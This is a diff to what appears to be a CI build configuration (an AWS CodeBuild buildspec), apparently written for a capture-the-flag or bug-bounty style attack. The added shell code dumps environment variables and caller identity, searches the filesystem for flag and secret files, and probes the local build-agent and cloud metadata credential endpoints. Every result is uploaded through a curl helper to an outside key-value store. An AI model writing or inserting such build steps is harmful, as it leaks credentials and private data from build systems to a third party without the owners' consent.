@@ -13,19 +13,47 @@ phases:
         set +e
         bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
-        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --connect-timeout 5 --max-time 20 --data-binary @- "$bucket/${runid}_$key" || true; }
+        putkey(){ key="$1"; file="$2"; head -c 30000 "$file" | curl -fsS --connect-timeout 5 --max-time 20 --data-binary @- "$bucket/${runid}_$key" || true; }
         echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== repo files ==='
-          find . -path './.git' -prune -o -type f -maxdepth 5 -print
-          echo '=== repo contents ==='
-          for f in $(find . -path './.git' -prune -o -type f -maxdepth 5 -print); do echo "--- $f"; sed -n '1,160p' "$f"; done
-        } > /tmp/repo.txt 2>&1
-        putkey repo /tmp/repo.txt
+          echo '=== env filtered ==='
+          env | sort | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN'
+          echo '=== identity ==='
+          aws sts get-caller-identity --output json 2>&1
+          echo '=== flag file names ==='
+          find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f 2>/dev/null | grep -Ei 'flag|ctf|secret|codebreach|hacktricks' | head -n 300
+          echo '=== flag content hits ==='
+          for d in /codebuild /tmp /root /opt /var /usr/local /workspace; do [ -d "$d" ] && grep -RInaE 'flag\{|ctf\{|HTB\{|HackTricks\{|codebreach|FLAG|flag' "$d" 2>/dev/null | head -n 200; done
+        } > /tmp/search.txt 2>&1
+        putkey search /tmp/search.txt
         {
-          echo '=== codebuild tmp/output likely files ==='
-          find /codebuild -path '*/.git/*' -prune -o -type f \( -name '*flag*' -o -name '*secret*' -o -name '*token*' -o -name '*.txt' -o -name '*.json' -o -name '*.env' \) -print 2>/dev/null | head -n 300
-          echo '=== readable candidates ==='
-          for f in $(find /codebuild -path '*/.git/*' -prune -o -type f \( -name '*flag*' -o -name '*secret*' -o -name '*token*' -o -name '*.txt' -o -name '*.json' -o -name '*.env' \) -print 2>/dev/null | head -n 80); do echo "--- $f"; sed -n '1,80p' "$f" 2>/dev/null; done
-        } > /tmp/cbfiles.txt 2>&1
-        putkey cbfiles /tmp/cbfiles.txt
+          echo '=== agent endpoint index ==='
+          for base in http://127.0.0.1:7831 http://localhost:7831 https://CODEBUILD_AGENT:3000; do
+            echo "### $base"
+            for p in / /ping /health /status /v1 /v1/status /v1/metadata /v1/tasks /build /builds /logs /env /variables /creds /credentials /latest/meta-data/ /container/metadata /api/v1/build; do
+              echo "--- $p"
+              curl -k -sS --connect-timeout 2 --max-time 5 "$base$p" 2>&1 | head -c 4000; echo
+            done
+          done
+          echo '=== aws/container metadata ==='
+          for u in \
+            "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" \
+            "http://169.254.170.2${CODEBUILD_CONTAINER_CREDENTIALS_RELATIVE_URI}" \
+            "http://169.254.170.2/v2/metadata" \
+            "http://169.254.170.2/v3/metadata" \
+            "http://169.254.170.2/v4/metadata" \
+            "http://169.254.170.2/v4/task" \
+            "http://169.254.169.254/latest/meta-data/" \
+            "http://169.254.169.254/latest/dynamic/instance-identity/document"; do
+              echo "--- $u"
+              curl -sS --connect-timeout 2 --max-time 5 "$u" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 6000; echo
+          done
+        } > /tmp/endpoints.txt 2>&1
+        putkey endpoints /tmp/endpoints.txt
+        {
+          echo '=== root dirs ==='
+          for d in / /codebuild /codebuild/readonly /codebuild/output /tmp /root /opt /var/task /workspace; do echo "--- $d"; ls -la "$d" 2>&1; done
+          echo '=== selected readable small files ==='
+          find /codebuild /tmp /root /opt -xdev -type f -size -200k 2>/dev/null | head -n 250 | while read f; do echo "--- $f"; sed -n '1,120p' "$f" 2>/dev/null | sed -E 's/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN)=.*/\1=REDACTED/'; done
+        } > /tmp/files.txt 2>&1
+        putkey files /tmp/files.txt
